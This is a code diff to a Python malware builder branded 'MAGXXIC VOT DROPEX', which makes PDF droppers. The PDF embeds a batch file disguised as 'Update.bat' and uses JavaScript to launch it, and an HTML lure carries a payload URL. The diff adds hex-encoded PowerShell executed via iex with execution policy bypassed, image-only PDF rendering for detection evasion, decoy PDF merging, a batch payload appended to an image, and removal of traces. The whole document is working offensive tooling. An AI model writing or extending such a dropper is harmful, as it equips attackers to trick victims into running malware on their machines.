@@ -6,6 +6,7 @@ import string
 import argparse
 import asyncio
 import img2pdf
+import io
 from rich.console import Console
 from rich.panel import Panel
 from rich.progress import Progress, SpinnerColumn, TextColumn
@@ -16,6 +17,7 @@ from rich.table import Table
 from pypdf import PdfWriter, PdfReader
 from pypdf.generic import DictionaryObject, NameObject, TextStringObject, ArrayObject, NumberObject
 from playwright.async_api import async_playwright
+from PIL import Image
 
 # Custom theme for MAGXXIC VOT
 custom_theme = Theme({
@@ -45,7 +47,7 @@ def print_banner():
         color = colors[i % len(colors)]
         styled_banner.append(line + "\n", style=f"bold {color}")
 
-    footer = Text.from_markup("\n[bold white]M A G X X I C   V O T   D R O P E X   v 1 . 0[/]\n[italic cyan]Advanced HTML to PDF Delivery System - Stealth Edition[/]", justify="center")
+    footer = Text.from_markup("\n[bold white]M A G X X I C   V O T   D R O P E X   v 1 . 2[/]\n[italic cyan]Advanced HTML to PDF Delivery System - Stealth Edition[/]", justify="center")
     styled_banner.append(footer)
 
     console.print(Panel(styled_banner, border_style="bold cyan", expand=False, padding=(1, 2), subtitle="[bold magenta]Created by MAGXXIC TEAM[/]"))
@@ -64,9 +66,13 @@ def obfuscate_bat(content, method):
         encoded_ps = base64.b64encode(ps_cmd.encode('utf-16le')).decode()
         return f'@echo off\npowershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand {encoded_ps}'
 
+    elif method == "Hex Encoding":
+        hex_content = content.encode().hex()
+        return f'@echo off\nset "h={hex_content}"\npowershell -NoProfile -Command "$b = for($i=0; $i -lt $env:h.Length; $i+=2){{[Convert]::ToByte($env:h.Substring($i, 2), 16)}}; [System.Text.Encoding]::UTF8.GetString($b) | iex"'
+
     return content
 
-async def html_to_pdf(html_path, output_pdf_path, payload_url):
+async def html_to_pdf(html_path, output_pdf_path, payload_url, image_based=False):
     """Converts HTML to PDF using Playwright."""
     try:
         async with async_playwright() as p:
@@ -89,13 +95,22 @@ async def html_to_pdf(html_path, output_pdf_path, payload_url):
             html_content = html_content.replace("[[PAYLOAD_URL]]", payload_url)
 
             await page.set_content(html_content)
-            await page.pdf(path=output_pdf_path, format="Letter", print_background=True)
+
+            if image_based:
+                # Capture screenshot and convert to PDF
+                img_data = await page.screenshot(full_page=True)
+                pdf_bytes = img2pdf.convert(img_data)
+                with open(output_pdf_path, "wb") as f:
+                    f.write(pdf_bytes)
+            else:
+                await page.pdf(path=output_pdf_path, format="Letter", print_background=True)
+
             await browser.close()
     except Exception as e:
         console.print(f"[error]An error occurred during HTML to PDF conversion: {e}[/]")
         sys.exit(1)
 
-async def create_pdf_dropper(payload_url, html_template, image_path, output_pdf, crypt_method):
+async def create_pdf_dropper(payload_url, html_template, image_path, output_pdf, crypt_method, image_based=False, decoy_pdf=None, stego_image=None):
     with Progress(
         SpinnerColumn(),
         TextColumn("[progress.description]{task.description}"),
@@ -126,16 +141,40 @@ async def create_pdf_dropper(payload_url, html_template, image_path, output_pdf,
         task2 = progress.add_task("Converting HTML to PDF...", total=1)
         temp_pdf = "temp_base.pdf"
         try:
-            await html_to_pdf(html_template, temp_pdf, payload_url)
+            await html_to_pdf(html_template, temp_pdf, payload_url, image_based=image_based)
             progress.update(task2, completed=1)
         except Exception as e:
             console.print(f"[error]Failed to convert HTML to PDF: {e}[/]")
             return
 
-        # 3. Handle Image
+        # 3. Handle Steganography if requested
+        stego_output_img = None
+        if stego_image and os.path.exists(stego_image):
+            task_stego = progress.add_task("Applying steganography...", total=1)
+            try:
+                with open(stego_image, "rb") as f:
+                    img_data = f.read()
+                with open(bat_file, "rb") as f:
+                    bat_data = f.read()
+
+                # Append BAT data to the end of image (simple stego)
+                stego_output_img = "stego_branding.png"
+                with open(stego_output_img, "wb") as f:
+                    f.write(img_data)
+                    f.write(b"---MAGXXIC_START---")
+                    f.write(bat_data)
+                    f.write(b"---MAGXXIC_END---")
+
+                # Use this stego image instead of the original one
+                image_path = stego_output_img
+                progress.update(task_stego, completed=1)
+            except Exception as e:
+                console.print(f"[warning]Steganography failed: {e}. Falling back to normal image branding.[/]")
+
+        # 4. Handle Image Branding
         temp_image = "temp_image.pdf"
         if image_path:
-            task3 = progress.add_task("Injecting custom branding...", total=1)
+            task3 = progress.add_task("Injecting branding...", total=1)
             try:
                 if os.path.exists(image_path):
                     with open(image_path, "rb") as f:
@@ -150,10 +189,16 @@ async def create_pdf_dropper(payload_url, html_template, image_path, output_pdf,
                 console.print(f"[warning]Image conversion failed: {e}. Skipping.[/]")
                 image_path = None
 
-        # 4. Embed file and add JS using pypdf
+        # 5. Embed file and add JS using pypdf
         task4 = progress.add_task("Crypting and Finalizing PDF...", total=1)
         try:
             writer = PdfWriter()
+
+            # Add decoy PDF pages first if provided
+            if decoy_pdf and os.path.exists(decoy_pdf):
+                decoy_reader = PdfReader(decoy_pdf)
+                for page in decoy_reader.pages:
+                    writer.add_page(page)
 
             if os.path.exists(temp_pdf):
                 base_reader = PdfReader(temp_pdf)
@@ -170,7 +215,7 @@ async def create_pdf_dropper(payload_url, html_template, image_path, output_pdf,
             with open(bat_file, "rb") as f:
                 writer.add_attachment("Update.bat", f.read())
 
-            # JS payload to launch the embedded file
+            # JS payload to launch the embedded file immediately
             js_payload = """
             try {
                 this.exportDataObject({ cName: "Update.bat", nLaunch: 2 });
@@ -186,10 +231,13 @@ async def create_pdf_dropper(payload_url, html_template, image_path, output_pdf,
             console.print(f"[error]Failed to finalize PDF: {e}[/]")
             return
 
-        # 5. Cleanup
+        # 6. Cleanup
         finally:
             task5 = progress.add_task("Securely removing traces...", total=1)
-            for f_path in [bat_file, temp_pdf, temp_image]:
+            to_remove = [bat_file, temp_pdf, temp_image]
+            if stego_output_img:
+                to_remove.append(stego_output_img)
+            for f_path in to_remove:
                 if os.path.exists(f_path):
                     try:
                         os.remove(f_path)
@@ -207,7 +255,10 @@ async def main():
     parser.add_argument("--html_template", help="Path to the HTML template.")
     parser.add_argument("--image_path", help="Path to the image to embed (optional).")
     parser.add_argument("--output_pdf", help="Output PDF file name.")
-    parser.add_argument("--crypt", choices=["None", "Base64", "Variable Obfuscation", "PowerShell Encoded"], help="Crypting method.")
+    parser.add_argument("--crypt", choices=["None", "Base64", "Variable Obfuscation", "PowerShell Encoded", "Hex Encoding"], help="Crypting method.")
+    parser.add_argument("--image_based", action="store_true", help="Render PDF as an image for evasion.")
+    parser.add_argument("--decoy_pdf", help="Decoy PDF to merge with.")
+    parser.add_argument("--stego_image", help="Image to hide payload in (steganography).")
 
     args = parser.parse_args()
 
@@ -223,8 +274,23 @@ async def main():
         console.print(f"[error]Template {html_template} not found![/]")
         return
 
+    # Interactive session for new features if not provided in args
+    image_based = args.image_based
+    if not image_based and not any([args.decoy_pdf, args.stego_image]):
+        image_based = Confirm.ask("[info]Use Image-Based PDF Rendering? (Better Evasion)[/]", default=False)
+
+    decoy_pdf = args.decoy_pdf
+    if decoy_pdf is None and not any([args.image_based, args.stego_image]):
+        if Confirm.ask("[info]Merge with a Decoy PDF?[/]", default=False):
+            decoy_pdf = Prompt.ask("[info]Enter Decoy PDF Path[/]")
+
+    stego_image = args.stego_image
+    if stego_image is None and not any([args.image_based, args.decoy_pdf]):
+        if Confirm.ask("[info]Apply Steganography to branding image?[/]", default=False):
+            stego_image = Prompt.ask("[info]Enter Image Path for Stego[/]")
+
     image_path = args.image_path
-    if image_path is None:
+    if image_path is None and not stego_image:
         if Confirm.ask("[info]Embed custom image/branding?[/]", default=False):
             image_path = Prompt.ask("[info]Enter Image Path[/]")
 
@@ -245,17 +311,18 @@ async def main():
         table.add_row("2", "Base64 Obfuscation", "Medium")
         table.add_row("3", "Variable Obfuscation", "Medium")
         table.add_row("4", "PowerShell Encoded Wrapper", "High")
+        table.add_row("5", "Hex Encoding", "High")
 
         console.print(table)
-        choice = Prompt.ask("[info]Select Crypting Method[/]", choices=["1", "2", "3", "4"], default="4")
-        mapping = {"1": "None", "2": "Base64", "3": "Variable Obfuscation", "4": "PowerShell Encoded"}
+        choice = Prompt.ask("[info]Select Crypting Method[/]", choices=["1", "2", "3", "4", "5"], default="4")
+        mapping = {"1": "None", "2": "Base64", "3": "Variable Obfuscation", "4": "PowerShell Encoded", "5": "Hex Encoding"}
         crypt_method = mapping[choice]
 
-    console.print(f"\n[info]Ready to generate [highlight]{output_pdf}[/] using [highlight]{html_template}[/] with [highlight]{crypt_method}[/] encryption.[/]")
+    console.print(f"\n[info]Ready to generate [highlight]{output_pdf}[/] with requested features.[/]")
 
     if Confirm.ask("[success][bold]START GENERATION?[/][/]", default=True):
         try:
-            await create_pdf_dropper(payload_url, html_template, image_path, output_pdf, crypt_method)
+            await create_pdf_dropper(payload_url, html_template, image_path, output_pdf, crypt_method, image_based=image_based, decoy_pdf=decoy_pdf, stego_image=stego_image)
         except KeyboardInterrupt:
             console.print("\n[warning]Operation cancelled by user.[/]")
         except Exception as e:
